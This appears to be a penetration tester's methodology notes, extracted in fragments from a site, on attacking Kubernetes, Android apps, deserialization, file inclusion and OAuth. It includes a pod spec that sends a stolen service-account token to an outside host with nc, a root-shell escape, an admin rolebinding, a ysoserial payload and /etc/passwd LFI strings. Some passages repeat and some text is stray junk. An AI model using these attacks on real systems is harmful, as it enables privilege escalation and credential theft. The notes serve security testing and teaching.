deployed with these settings: securityContext: priviliged: true hostPID: true It means that you can run the following command in the Pod to get a root shell on the underlying host: sudo nsenter -a -t 1 bash Recommendation Use the adminission controller Pod Security Policy and disallow hostPid. Restrict the use of \"priviliged\" containers [ ] Check which services are exposed When an application is deployed, through a Pod or Deployment, it will not automatically become available to users outside the kubernetes cluster. In order to direct traffic to those services a kubernetes service is needed. We need to check what services are exposed externally, to see if any sensitive servicea accidentally has been expoesed. If those services are vulnerable or not can be considered out of scope (we are not testing the applications hosted on the cluster). But some kubernetes specific services might be exposed, and that might constitute a finding. kubectl get services -A -o wide [ ] Check which versions kubernetes components are running A kubernetes cluster consist of many components, and those components vary from cluster to cluster. Some of these components are vulnerable, for example older Traefik versions are vulnerable to RCE. You can check which versions the components have by checking which image they use, this can be Check which image versions of deployments: kubectl describe deployments -A","title":"Basic tests"},{"location":"attacking_kubernetes/attacking_kubernetes/#authorization","text":"There are some quirks regarding the authorization system that might be interesting. For example, a user (maybe even a service account) might have the right to execute commands on pods, but it might not have the right to deploy new pods. If that is the case then it is possible to simply execute a command on other pods and extract the auto-mounted credentials, and then use those credentials to, for example, deploy a new pod. In this way it is possible to escalate in priviliges within a cluster. The most basic components of RBAC (Roles Based Access Control) are the following: ClusterRoles A ClusterRole applies to the whole cluster. Roles A normal Role only applies to a specific namespace. ClusterRoleBindings RoleBindings RBAC grant access to resources with specifc verbs, like get , describe . A resource is basically information that can be access. Secrets, pod information etc. The verbs specify how the resource can be access, get,list,watch etc. RoleBindings and ClusterRoleBinding is of course the way we bind a specific role to a specific user. One tool that I have found that can be of interest is this: https://raw.githubusercontent.com/cyberark/kubernetes-rbac-audit/master/ExtensiveRoleCheck.py https://github.com/cyberark/kubernetes-rbac-audit kubectl get roles --all-namespaces -o json > Roles.json kubectl get clusterroles -o json > clusterroles.json kubectl get rolebindings --all-namespaces -o json > rolebindings.json kubectl get clusterrolebindings -o json > clusterrolebindings.json python ExtensiveRoleCheck.py --clusterRole clusterroles.json --role Roles.json --rolebindings rolebindings.json --cluseterolebindings clusterrolebindings.json To list service accounts: kubectl get serviceaccounts -A [ ] Check for interesting user and service account rights One kind of complicated way to test what a specific user can do is to run the following # Check if your current user can run `exec` on pods. kubectl auth can-i exec pods kubectl auth can-i get pods Take low priviliged account that you have been given or compromised, and use that account when you run: kubectl auth can-i --list kubectl auth can-i --list -n SomeNameSpace So what to look for? Look for the verb list together with secrets . That might mean that you can list other users secrets, and steal their JWT token. Resource Verb Comment secrets list or * secrets get * get Can be used to get secrets. asdasdlasdhaklw Can be used to get secrets. [ ] Check for CVE: CVE-2018-18264 Privilige Escalation kubectl proxy 8001 In your browser go to http://localhost:8001 If you can access it, klick on \"skip\" for the authentication. The go to URL: /api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs and see if you can get some secrets. The simple way to check this is to see if the kubernetes version is below: 1.10.1 kubectl version https://sysdig.com/blog/privilege-escalation-kubernetes-dashboard/ [ ] Create Pod in kube-system namespace and automount service account So if you have a kubernetes user that can deploy pods in any namespace you can mount in a high priviliged service account into the the pod, and then extrct those credentials. This can be done in the following way. Deploy the following pod: apiVersion: v1 kind: Pod metadata: name: alpinetest namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true This technique can be used if your user does not have the permission to list secrets, but is allowed to deploy pods in any namespace. Also, you do not have to have the exec permission to use the attack. You can deploy the pod to automatically send the credentials, like this: apiVersion: v1 kind: Pod metadata: name: alpine namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true [ ] Deploy pods using Create/update deployment, Daemonsets, statefulsets,Replicationcontrollers, Replicasets, Jobs, Cronjobs There are many ways to deploy pods. Even if your user is not allowed to create a pod it might be possible to create pods using other types of workloads. All these ways can be used to deploy pods and possibily escalate priviliges using the technique explained in the issue above. Workloads that can be used to create pods are the following: Create/update deployments Daemonsets Statefulsets Replicationscontrollers Replicasets Jobs Cronjobs Readthe documentation for each for in order to see how to do it. As in the attack above you will need to be able to deploy in the namespace kube-system . https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-1/ [ ] Privilige to use Pods/Exec This is pretty simple. But if your user has the permission to perform pods/exec with any namespace you can simply enter into any pod, and extract the default service accounts. kubectl exec -it <POD NAME> -n <POD\u2019S NAMESPACE> -- sh [ ] Privilege to Get/patch rolebindings The idea here is if your user has the permission to edit rolebindings that use can simply bind a user to the ClusteAdmin role and thereby escalate priviliges to the highest. Check your priviliges with your low priviliges user with the following command: kubectl auth can-i --list If you have the permission to create Rolebindings you can create a malicious rolebinding like this: You might have to change the namespace and the service account to your service account and namespace. { \"apiVersion\": \"rbac.authorization.k8s.io/v1\", \"kind\": \"RoleBinding\", \"metadata\": { \"name\": \"malicious-rolebinding\", \"namespace\": \"default\" }, \"roleRef\": { \"apiGroup\": \"*\", \"kind\": \"ClusterRole\", \"name\": \"admin\" }, \"subjects\": [ { \"kind\": \"ServiceAccount\", \"name\": \"default\", \"namespace\": \"default\" } ] } If it works you can use the token of the service account to do anything to want in the cluster. [ ] Check for impersonation privileges There exists a functionality to impersonate service accounts. This can be used if you want to check that a a serviceaccount has apropriate priviliges, but it can also be used for malicious intents. curl -k -v -XGET -H \u201cAuthorization: Bearer <JWT TOKEN (of the impersonator)>\u201d -H \u201cImpersonate-Group: system:masters\u201d -H \u201cImpersonate-User: null\u201d -H \u201cAccept: application/json\u201d https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/ [ ] Check if RBAC is used Role-Based Access Control has been the stable since version 1.8 RBAC is enabled by the apiserver by starting the apiserver with this flag --authorization-mode=RBAC If you don't ahve access to the apiserver flags you can check it interactivly by running: kubectl api-versions If you see the following output RBAC is enabled: rbac.authorization.k8s.io/v1 rbac.authorization.k8s.io/v1beta1 If Kubernetes is run as a managed cluster with Azure you can check if with the following: az aks list Check for: RBAC true However, it is still possible to disable. Do check that it is enabled.","title":"Authorization"},{"location":"attacking_kubernetes/attacking_kubernetes/#security-audit","text":"The security audit is a profile used when the tester has a kubernetes user with read privileges and is able to talk to the apiserver. [ ] Check if PodSecurityPolicy is supported It might be that kubernets is started without enabling PSP. kubectl get psp If PSPS is not supported, or enabled you will get the following error: the server doesn't have a resource type \"podSecurityPolicies\". If it is supported you get either the policies or an error such as: No resources found Recommendation Enable PSP. This is done differently according to the vendor. In Minikube it can be done the following way: minikube start --extra-config=apiserver.GenericServerRunOptions.AdmissionControl=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds,PodSecurityPolicy [ ] Check if PodSecurityPolicy is used Remember to add the -A flag, so that you can view the podsecurity policies in all namespaces. kubectl get psp -A kubectl describe psp Inspect the PSPs. Now you need to figure out which PSPs are actually used. PSPs are applied to Pods using annotations. If you are clusteradmin, and can check all pods in all namespaces, you can run the following command: kubectl describe pods -A Now check the annotations part to see which PSP is applied to each Pod. The annotation part usually look something like this: Annotations: kubernetes.io/psp: <name of PSP> [ ] Static analysis of yaml files - Searching for secrets Secrets should not be stored in the yaml configuration for workloads such as pods, deployments, jobs etc. Maybe a secret is stored in an environment variable in the a yaml, and that yaml is accessible to everyone. kubectl describe pods -A kubectl describe deployments -A There are a lot of other bad configurations that can be introduced. One way to check these is with the tool kubesec. I have not used this tool, and not audited it. So run it on your own responsibility. https://kubesec.io/ I think you can just output the yaml file and then run it in kubesec. kubectl describe deployments -A > describe-deployments.txt cat -n describe-deployments.txt | sed -n '/Environment/,/Mount/p' kubectl get pod kubeaudit-6f5964556b-5vnk5 -o yaml [ ] Check that pods are running as non-root users By having the services on the containers running as a non-root user it makes it more difficult for an attacker to escape the the container to the host os. The container is sandboxed from other containers running on the host with the help of linux namespaces. It is more probable that a container breakout is possible if the pod is running as root. Another reason to not run a service as root is that if kubernetes has been misconfigured to accidentally expose volumes to the container, the volume will still not be able to mount because of lacking root priviliges. This can be verified the following way, albeit not perfectly. This way will only show if the service in the container is running as root or some other user. It might be that it is possible to run sudo su and escalate priviliges. kubectl -n thenamespace exec mypod whoami and kubectl -n thenamespace exec -it mypod /bin/bash Therefore it is better to configure a PodSecurityPolicy to handle the problem. It is possible to create a PodSecurityPolicy that disallows containers to run as root. If such a policy exists the apiserver will disallow the deployment of a container that is running as root. The following lines in a PodSecurityPolicy disallows containers from running as root. # Required to prevent escalations to root. allowPrivilegeEscalation: false runAsUser: # Require the container to run without root privileges. rule: 'MustRunAsNonRoot' One issue that might occur here is that the app cant use ports below 1024. This can be solved by running the app on a higher port, by expose it on a lower. An example of this could be the following: kind: Service apiVersion: v1 metadata: name: my-service spec: selector: app: MyApp ports: - protocol: TCP port: 443 targetPort: 8443 https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/ [ ] Check the usage of network policies NetworkPolicy is just a kubernetes-word for firewall.

It can be beneficial to divide the componenets of Kubernetes into Software and Hardware. So let's start with the hardware. Hardware # A kubernets cluster is the sum of all kubernetes nodes. A node will likely be a physical machine or a virtual machine in a datacenter. A program can run on any of the nodes. It can change, so the program should not be storing data on a specific node, because the program might end up running on another node. To store data persistently Kubernetes uses Persistent volumes. This can be a local or a cloud drive. Think of it has an external harddrive that you plug into your cluster. Persistent volumes can be mounted to the kubernetes kluster, at which point it is accessible from all nodes. Software # Programs running in the kubernetes klusters are package in containers. The most common and popular one is of course Docker. You usually have one service per container. Pods # Containers are run in Pods. If you application becomes really popular, and can't handle the load, you can simply configure your Pod to have more replicas. Pods can hold serveral containers, but it might be better to just have one container in each pod. Since you might want to scale up only one container, and not all the other containers in the pod. You might waste a lot of resources if you scale up a Pod that containes containers that does not need to be scaled up. Deployment # Deployment is an abstraction that defines how many replicas of pods you want. Using deployment you will not deal with pods directly.

Admission controller / PodSecuriyPolicy # Admission controller sits between the client and the master-api, it kind of works as a filter and a check. The most important admission controller, from a security perspective, is PodSecurityPolicy. You can list the PSP by running this command: kubectl get psp -A - Read the specifications of a specific PSP kubectl describe psp privilege So, how do we implement a PSP? It involved three steps: 1. Create PSP 2. Create a Role that is associated with the PSP 3. Create a Rolebinding that binds the Role to a user, serviceaccount or group. After that the PSP will be implmented for those specific users that are associated through the rolebinding. So, PSP is not set in the manifest file of pod or deployment. The PSP is instead associated to a user through the rolebinding. Setting up a kubernetes cluster in GCLoud # After you have installed GCloud CLI, enabled billing,, and Enabled Kubernets API for your specific project you can create a kluster like this: gcloud container clusters create my-cluster --zone us-west1-a You can start to manage your cluster with kubectl, but first you need to setup credentials to do it: gcloud container clusters get-credentials my-cluster --zone us-west1-a --project kuberntest If you go to the gcloud console you can see that the Kubernetes cluster is created. And if you go to Computer you can see three VM instances created, these are your nodes. If you want to remove them you should do that through kubernetes and not though gcloud, because if you remove those VMs the cluster will just spin up new VMs. Now you can deploy a service to your kluster with the following command Where gitea.yaml is a yaml-config file, which incluldes a docker-image from dockerhub. kubectl apply -f gitea.yaml The file looks like this: apiVersion: v1 kind: Pod metadata: name: gitea-pod spec: containers: - name: gitea-container image: gitea/gitea:1.4 You can now check your pods with this command: kubectl get pods Components # This image describes the components of kubernetes pretty well: Some interesting things to note here is that the API server is the only component that should talk to etcd. Etcd # Etcd contains all the state of the cluster. It contains information, such as cloud metadata, credentials. It is a key-value database. Etcd is the final word of the state of cluster. So if you have write priviliges to the etcd database you basically own the cluster. Api-server # If you control the api-server, either through a shell or with a user with high privilige access you have a high degree of control over the cluster. Kubelet # Kubelet has its own API, and with access to it you can perform a lot of actions. Kubelet has historically been used in a lot of attacks. Lifecycle of a POD # This image describes pretty well the lifecycle of a pod kubectl or any other API client submits the Pod spec to the API server. The API server writes the Pod object to the etcd data store. Once the write is successful, an acknowledgment is sent back to API server and to the client. The API server now reflects the change in state of etcd. All Kubernetes components use watches to keep checking API server for relevant changes. In this case, the kube-scheduler (via its watcher) sees that a new Pod object is created on API server but is not bound to any node. kube-scheduler assigns a node to the pod and updates the API server. This change is then propagated to the etcd data store. The API server also reflects this node assignment on its Pod object. Kubelet on every node also runs watchers who keep watching API server. Kubelet on the destination node sees that a new Pod is assigned to it. Kubelet starts the pod on its node by calling Docker and updates the container state back to the API server. The API server persists the pod state into etcd. Once etcd sends the acknowledgment of a successful write, the API server sends an acknowledgment back to kubelet indicating that the event is accepted.

The API server writes the Pod object to the etcd data store. Once the write is successful, an acknowledgment is sent back to API server and to the client. The API server now reflects the change in state of etcd. All Kubernetes components use watches to keep checking API server for relevant changes. In this case, the kube-scheduler (via its watcher) sees that a new Pod object is created on API server but is not bound to any node. kube-scheduler assigns a node to the pod and updates the API server. This change is then propagated to the etcd data store. The API server also reflects this node assignment on its Pod object. Kubelet on every node also runs watchers who keep watching API server. Kubelet on the destination node sees that a new Pod is assigned to it. Kubelet starts the pod on its node by calling Docker and updates the container state back to the API server. The API server persists the pod state into etcd.

The guide and the checklist concerns both Android and iPhone. Setup # Android # We wan to do three different things to test the application: static analysis, dynamic analysis and api-analysis. Static analysis simply refers to inspecting the contents of the application package. In android this is an apk-file. The static analysis can be done using MobSF in linux. A dynamic analysis refers to analysis of the package when it is running. To analyse that we will use Drozer. API-test - Configuration # What we want to do is to be able to send the mobile applications traffic to burp to inspect the http traffic. This can be done in two ways. By proxying the phones traffic to your burp instance, or set up an access point and MITM the phone that way. Invisible intercept # So this technique works by creating a access-point that your mobile phone connects to, and then man-in-the-middle all the traffic through iptables. Redirect the network-card to your VM The first problem I ran into was that the USB-adapter wouldn\u2019t be redirected into the virtual machine. I looked in syslog when I tried to redirect it, and I noticed some error messages from apparmor. It was something like this: apparmor=\"DENIED\" operation=\"open\" profile=\"libvirt-...\" name=\"/run/udev/data/+usb\" comm=\"qemu-system-x86\" The command was qemu-system-x86 , and the operation was open , but apparmor denied the action. After some googeling I figured out that I need to edit the apparmor profile for libvirt-qemu. So I edited this file like this: sudo vim /etc/apparmor.d/abstractions/libvirt-qemu # For hostdev access. The actual devices will be added dynamically /sys/bus/usb/devices/ r, /sys/devices/**/usb[0-9]*/** r, # THIS LINE NEEDS TO BE ADDED /run/udev/data/* rw, Add USB to Virtual Machine If the USB adapter is using USB 3 you might need to change the USB Controller in virt-manager to USB 3. Just change it in Controller USB from 2 to 3. Next you go to Add Hardware , USB Host Device . Another way is to open the VM in spicy/virt-manager and then go to Input/Select USB Devices for Redirection. That usually doesn't work for me though. Verify that the USB-adapter is connected by either checking ifconfig or lsusb . Hopefully you will see the wlan0 network interface. Create a hotspot If you have network-manager it is really simple to set up an access-point. Open up network-manager: nm-connection-editor Then you click Add select Wi-fi . You name the hotspot and change Mode from Client to Hotspot . Then you edit wifi-security, and click Save . Now you should have a working hotspot. You can verify it by looking for it from your host or smartphone. Now just connect to it from the smartphone you want to MITM. You should now be able to see the phones traffic passing by. You can use tcpdump to see that it works. If your device connects but does not get an IP it is probably because you are missing a dhcp-server. You just need to install dnsmasq, and network manager will figure out the rest. tcpdump -i wlan0 Redirect traffic to Burp through iptables apt-get install iptables-persistent iptables-save > rules # Then you edit the rules and add them by: iptables-restore < rules So these are the rules to be added.

Are the permissions correct in relation to what the application is doing? Some a universally dangerous permissions, like the following. There is not many legitimate reasons to allow an app to install other packages. android.permissions.INSTALL_PACKAGES Each permission has a android-defined permissions level: normal , dangerous and signature . https://developer.android.com/guide/topics/permissions/overview#normal-dangerous If a permission is defined as \"dangerous\", such as reading contacts. The user must explicitly agree to the permission for it to be active. Exploiting application components # There are four types of \"components\" in an android applications: - Activity - screens/views - Content provider - database objects - Services - background workers - Broadcast receiver Three of these four components are activated using asynchronous messages called \"intents\". The components that are activated using intents are activity , services , and broadcast receivers If a component is exported or not is defined in the manifest.xml file. You can map the attacksurface of the components using these drozer commands run app.package.list run app.package.attacksurface app.theapp Exploiting exported activities # What is an intent? \"An Intent provides a facility for performing late runtime binding between the code in different applications. Its most significant use is in the launching of activities, where it can be thought of as the glue between activities. It is basically a passive data structure holding an abstract description of an action to be performed.\" A good explanation of how this attack works is here: https://appsec-labs.com/portal/hacking-android-apps-through-exposed-components/ Activities that are specified as \"exported\" in the manifest file can be run by other applications on the phone. In a sense, the other application is just running a function on the victim-application. What that function does depends on the application. The Activities might just start a new view. But they may also include arguments. Look for activities that are exported and allows arguments. .getExtras To check which activitites are exported run: run app.package.list run app.package.attacksurface com.appen.blabla Attack Surface: 2 activities exported 2 broadcast receivers exported 0 content providers exported 2 services exported Now you want to check which activities those are: run app.activity.info -a com.appen.blabla run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList Hidden view # There might be hidden functionality in the application, than can be accessed by a user, using adb or drozer. It might be the case that only premium users should be able to access certain functionality. ANd that functionality is accessible in the application, but there is no backend checks. So a user would be able to use the free version, but access functionality that should only be accessible to premium users. Check for: List the activities, and test them. Do they expose functionality that should not be accessible to the user. run app.activity.info -a com.theapp.blabla Phishing # Check if an activity that is exported, and therefore can be started by other applications, can be used in some kind of phishing-attack. The idea would be to create a fake application, that does something, and then open up the activity of the victim-application, thereby tricking the victim into inserting data into that view.

Deserialization (aka marshaling) = process of converting string to programming object Serialization is supported is many programming languages, like Java, Python, Ruby, Php. Burp Suite is looking for deserialized objects in its passive scan (you can see this if you go to scanning ooptions and look for \"serialized objects in HTTP message\". Exactly how it does this is unclear. I have seen it identify a PHP serialized object. Serialization is often times done in order to be able to send the object, over the network, for example. Or so that it can be stored. Both JSON and XML are example of serialized data. Java deserialization attacks # Anything can be serialized, it doesn't have to be an object. It can be a string, boolean, function, etc. The difficuly of exploiting deserialization bugs is that you can never introduce code. You will only be able to control the properties of already existing objects. That is why it is called POP-gadget, property-oriented-programming. This difficuly is in part overcome due to the fact that many applications load in libraries where useful classes exist. That is what ysoserial does. It just creates payloads that can be used if a specific library exists, and then you just test all of them. It is kind of a shot gun approach. So, unles you have access to the source code your best bet is probably to just use the shotgun approach and send in all ysoserial payloads, and hope that the application has included one of ysoserial third-party libraries. However, it should be noted that testing all payloads might lead to an unhandled exception and the application might crash. So there is always that risk involved. The ysoserial payloads are blind payloads, and not command output is returned. Identify # WIth the source code / white-box # In source code: You can check the source code to find out if a vulnerable library is being used. The functions to serialize or unserialize in Java is Here is an example, where we serialize the string \"name\", and write the output to a file called file.bin. The function that actually serialize the object is out.writeObject(name) import java.io.*; public class Serial { public static void main(String[] args) { String name = \"Nytro\"; String filename = \"file.bin\"; try { FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); // Serialization of the \"name\" (String) object // Will be written to \"file.bin\" out.writeObject(name); //Here is the serialization. The serialized object is written to the file file.bin out.close(); file.close(); } catch(Exception e) { System.out.println(\"Exception: \" + e.toString()); } } } The result of the code is that the object is written to a file, if we look at the content of that file it shows us the following: AC ED 00 05 74 00 05 4e 79 74 72 6f ....t..Nytro This is just like a a PHP serilaized object, but the \"syntaxt\" to read it is a bit more difficult, because it is binary and not only ASCII as in PHP. Data starts with the binary \"AC ED\" - this is the \"magic number\" that identifies serialized data, so all serialized data will start with this value Serialization protocol version \"00 05\" We only have a String identified by \"74\" Followed by the length of the string \"00 05\" And, finally, our string For more documentation on the protocol on serialized objects see: https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html So, how to we deserialize it again? Just as writeObject() serializes an object readObject() deserializes the object. String name; String filename = \"file.bin\"; try { FileInputStream file = new FileInputStream(filename); ObjectInputStream out = new ObjectInputStream(file); // Serialization of the \"name\" (String) object // Will be written to \"file.bin\" name = (String)out.readObject(); System.out.println(name); out.close(); file.close(); } catch(Exception e) { System.out.println(\"Exception: \" + e.toString()); } It is not only readObject() that is vulnerable. The following methods are some that also deserializes an object: readResolve readExternal readUnshared XStream So, in order to identify deserialization vulnerabilities we need to identify an entry point, and code snippets/objects that we can manipulate the properties of. Entry point # We can look for the usage of the following class: java.io.ObjectInputStream Or for classes that are serializeable and implekentn the readObject class. Serialized java objects always begin with ac ed in hex, and r00 in base64 objects. Without source code / black box # ac ed is the \"magic number\" for deserialized objects. Check the POST body or other areas for the base64 string r00AB . If it is not base64 encoded, it will looke like something with non-printable characters, and it might include stuff like /java/lang/string and things like that. It might look something like this: \u00ac\u00ed..sr..LogFile\u00d7 You can also look for the following content-type: application/x-java-serialized-object https://blog.netspi.com/java-deserialization-attacks-burp/ Example of vulnerable servers: WEbLogic WebSphere Jboss I JBoss 6.1.0 applikationer s\u00e5 \u00e4r det s\u00e5rbara URL:en /invoker/JMKInvokerServlet . Jenkins Soffid IAM Serialized java objects can be found in HTTP Request parameters, view state or cookies. Exploit # Okay, so you have identified where the application is receiving serialized java objects. As i mentioned before, you will only be able to exploit it if the application is compiled with classes that can cause harm. How will you know that if you are black-box testing? Well, you don't. So you just test every single payload possible. Luckily there are common libraries that have vulnerable classes that are known, so if the target application is compiles with those libraries it is possible to exploit. A common way to produce the exploits is by using the tool ysoserial. It can be found here: https://github.com/frohoff/ysoserial If you want to compile it yourself you just need to download the source-code. apt install maven apt install openjdk-8-jdk mvn clean package -DskipTests Otherwise you can just download the jar-file and hope that it is not tampered with. You generate your payload like this: java -jar ysoserial-0.0.5-all.jar Groovy1 \"touch /tmp/poooooowdn\" > payload.txt You have to check the help section to see what payloads are avaiable. There is a also a burp plugin that will generate and test the payloads. Anyways, I just wanted to explain a little bit about how these payloads actually work. So, the only thing an attacker can control is which object to send, and the properties of that object. PHP deserialization attacks # In order to turn an object into a string in PHP you can use serialize() This can be exmplified like this <?php $the_array = array(\"lorem\", \"ipsum\", \"Dolor\"); $serialized = serialize($the_array); print $serialized; ?> // the following will be printed: a:3:{i:0;s:5:\"lorem\";i:1;s:5:\"ipsum\";i:2;s:5:\"Dolor\"} It is pretty simply to decode: array containing 3 elements a:3 index 0, string with five characters, which are lorem i:0;s:5:lorem etc. Unserialize does the same thing, but the other way around. It takes serialized strings and turn them into objects. $theobject = unserialize('\"a:3:{i:0;s:5:\"lorem\";i:1;s:5:\"ipsum\";i:2;s:5:\"Dolor\"}'); Magic methods # Okay, but let's say that we can send in a serialized object to have it unserialized. What can that even do? How can the code be executed? Enter PHP autoloading. PHP objects/classes can have methods that are automatically executed when the class is initialized. These automatic functions are sometimes called magic method. THe following are examples of some magic methods. Remember that there is not guarantee that a class has these magic methods. But if the class do have it they will automatically execute. So if the class has any of these methods they will be run when the class is initilized, for example by doing: <?php $newinst = new LoggerClass(); //Or when deserializing an object $serializedObj = serialize($newinst); unserialize($serialized) __construct() __destruct() __call() __callStatic() __get() __set() __isset() __unset() __sleep() __wakeup() __toString() __invoke() __set_state() __clone() __autoload(). The most common methods are __construct , __destruct , __wakeup However, there are many more. When you run unserialize() the object is instatiated. It is the same as running new class() . So, in orderto exploit the vulnerability, we need the following requirements: The application must recieve a serialized object somewhere from the user. From a GET or POST parameter for example, or in a Cookie. The PHP file where the unserialize-function is executed must contain a useful class, or import a class that is useful. The useful class must contain a magic function that perform the useful action, such as writing to disk. A common magic method is destruct. It is run when the obejct is terminated. A common usage for it, is to be used to store cache files on disk, or stuff like that. Or perform shutdown queries to a database for example. __destruct() Exploit # Exploiting PHP serialization attacks is quite difficult if you don't have access to the source code, because you don't know what classes are available. In order to exploit a PHP deserialization attack the following requirements are necessary: The application must unserialize data that can be controlled by the attacker. The application must have a class which implements the PHP magic methods __wakeup or __destruct . Or any other magic method. The class with the magic method needs to be included in the file where the unserialize is happening. The class must do something that can be of interest to the attacker, such as writing to disk, so you can upload a shell. Step 1 - find unserialize # Burp will look for strings that might be serialized. So check your passive scanner in burp, it says something like \"Serialized object in HTTP message\". Check for strings that look like this: s:1:\u201ds\u201d;s:13:\u201dHi this test \u201c; However, it is more likely that the serialized object is actually base64-encoded, so decode all base64-encoded data you find. With source-code: If you check the source-code looks for: unserialize() If you see that function in the source-code, look to see if user-controlled data is sent to the unserialize() function. Just search all the source files for unserialize , in wordpress it may also be called maybe_unserialize . Now, you also need to find out if the input parameter to unserialize can be controlled by the attacker. Find out where it comes from. Step 2 - Find a class to abuse # Okay, so you have found a point where attacker-controlled data is sent to unserialize() . Now we need to find a class that is: - A. Contains a magic function. - B. Performs an action that is desirable to the attacker (such as writing to disk) - C. Available to use - D. Build payload So in what end do we start? We can start in different ends, either by searching the source-code for magic functions, or search the source-code for useful functions and hope that they are executed from a magic function. A. Contains a magic function Maybe start looking through the source-code for functions like: __construct __destruct __wakeup B. Performs an action that is desirable to the attacker When you have identified a class containing a magic function you need to see if the magic function performs an action that is desirable to the attacker. Remember that the attacker can controll all properties in the class. A common function to be abused is for a class to write error messages to log files. The file_put_contents -function could be in another function that is called from __destruct . An example of such a class would be the following: <?php class Logger(){ $stringLogfile; $stringLogtext; public function __destruct() { file_put_contents($stringLogfile, $stringLogtext, FILE_APPEND); } } ?> Remember that what is a desirable function may vary, of course it would be great to write to files or execute commands. But it could be any other type of action, such as deleting a file, or writing to a database. Or making a request somewhere. But here are some well known desirable functions to search for: File Access: file_put_contents() file_get_contents() unlink() Command execution: exec() passthru() popen() system() C. Available to use Now we have identified a class which contains a Magic function that performs an action that is desirable to us, now we only need to make sure that is is available to us. This will require you to go from the source-file where the unserialize-function is executed backwards to see if the usable class is included. Remember that classes are included recursivly. So if your source-file your have: <?php //My vulnerable class include_once(\"someotherclass.php\") unserialize($COOKIE->\"USER\") ?> You need to check out someotherclass.php <?php //someotherclass.php require(\"moreclasses.php\") include_once(\"evenmoreclasses.php\") ?> <?php //moreclasses.php ?> If you don't feel like doing this type of analysis, you can just hope that all files are included, something which is not uncommon, and just run your exploit and hope for the best. D. Build payload It is a tedious work to actaully build the serialized string by hand. So a better way is to have PHP do it. Just copy the entire class, edit the properties that you need to use, serialize it and then base64-encode it, if that is required. If you get errors when you serialize the class it might be because the code is referencing other classes, you can sometimes fix this simply by removing that code. Here is an example of a class, and how to produce a serialized object of it. REMEBER to URL encode the payload before you send it, or base64-encode it if that is required: // testfil.php <?php class JustTesting { var $file = \"/path/to/file.php\"; public function __destruct(){ echo file_get_contents($this->file, TRUE); } } $newTest = new JustTesting(); echo serialize($newTest); ?> apt install php-cli php -f testfil.php Now you just copy the payload and send it in. Blackbox # So, as an attacker you can't know what classes are included, what classes are available to you. However, if the application is built using framework. Such as composer, composer will include all all composer libraries. So you might find a class from any of those libraries.

You will only be able to control the properties of already existing objects. That is why it is called POP-gadget, property-oriented-programming. This difficuly is in part overcome due to the fact that many applications load in libraries where useful classes exist. That is what ysoserial does. It just creates payloads that can be used if a specific library exists, and then you just test all of them. It is kind of a shot gun approach. So, unles you have access to the source code your best bet is probably to just use the shotgun approach and send in all ysoserial payloads, and hope that the application has included one of ysoserial third-party libraries. However, it should be noted that testing all payloads might lead to an unhandled exception and the application might crash. So there is always that risk involved.

This vulnerability lets the attacker gain access to sensitive files on the server, and it might also lead to gaining a shell. How does it work? # The vulnerability stems from unsanitized user-input. LFI is particularly common in php-sites. Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file. $file = $_GET['page']; require($file); In this example the user could just enter this string and retrieve the /etc/passwd file. http://example.com/page=../../../../../../etc/passwd Bypassing the added .php and other extra file-endings # It is common to add the file-extension through the php-code. Here is how this would look like: $file = $_GET['page']; require($file . \".php\"); The php is added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to the end of our attack-string the .php will not be taken into account. So we add %00 to the end of our attack-string. http://example.com/page=../../../../../../etc/passwd%00 This technique is usually called the nullbyte technique since %00 is the nullbyte. The technique only works in versions below php 5.3. So look out for that. Another way to deal with this problem is just to add a question mark to your attack-string. This way the stuff after gets interpreted as a parameter and therefore excluded. Here is an example: http://example.com/page=../../../../../../etc/passwd? Bypassing php-execution # So if you have an LFI you can easily read .txt -files but not .php files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter. http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run: base64 -d savefile.php Linux # Tricks # Download config-files in a nice style-format If you read files straight in the browser the styling can becomes unbearable.

It should probably be called OAuthz to remind people that OAuth should be used for authorization and not authentication. It is generally used as a mechanism to delegate authorization. An end user can allow a party access to its data which is stored at another party. The problem that OAuth tries to solve, in a nutshell, is this: a user wants to share its data between two applications. The crazy stupid one to do this would simply be to give his/her password to the application that he/she wants to share data with. And the application can simply log in and retreive the data. This would of course be crazy, because everyone would have to share their creds to a lot of applications. So how can we share data between applications without sharing the users credentials? Let's create some better terminology for this: 1. Resource owner (RO) - usually the enduser. 2. Client - The application that wants access to the Resources owners resources. 3. Authorization server - The server that asks the RO for access on behalf of the client. 4. Resource Server - Server that stores the ROs data. It is common that the Authorization server and the resource server is the same actor. Facebook, Google, Github. In OAuth terminology one talks about different grant_types. There are four different grant_types: 1. Authorization code 2. Implicit 3. Resource owner password credentials - This is the problem that I previously wrote that OAuth tries to solve. 4. Client credentials Authroization code - Code Flow # Let's walk through the grant type Authorization code. This is usually called Code Flow.

